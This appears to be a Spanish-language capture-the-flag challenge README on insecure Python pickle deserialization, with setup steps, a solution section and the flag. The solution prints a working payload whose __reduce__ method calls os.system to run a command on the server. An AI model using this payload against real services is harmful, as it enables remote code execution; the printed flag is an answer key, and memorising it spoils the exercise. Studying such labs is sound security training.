# Deserialización Insegura (WEB - Difícil)

## Descripción
La aplicación deserializa datos pickle sin validación. Esto permite ejecutar código arbitrario en el servidor.

## Instrucciones
1. Inicia el servidor: `python app.py`
2. Genera un payload malicioso que ejecute código
3. Envía el payload al endpoint `/load`

## Solución
Ejecuta el exploit:
```bash
python exploit.py
```

Esto generará un payload que al ser deserializado ejecutará un comando del sistema.

Payload personalizado:
```python
import pickle, base64, os
class RCE:
    def __reduce__(self):
        return (os.system, ('whoami > /tmp/out.txt',))
payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)
```

## Flag
```
CTF{deserialize_rce}
```

## Conceptos
- Deserialización insegura
- Pickle exploitation
- Remote Code Execution (RCE)
- Python object marshalling
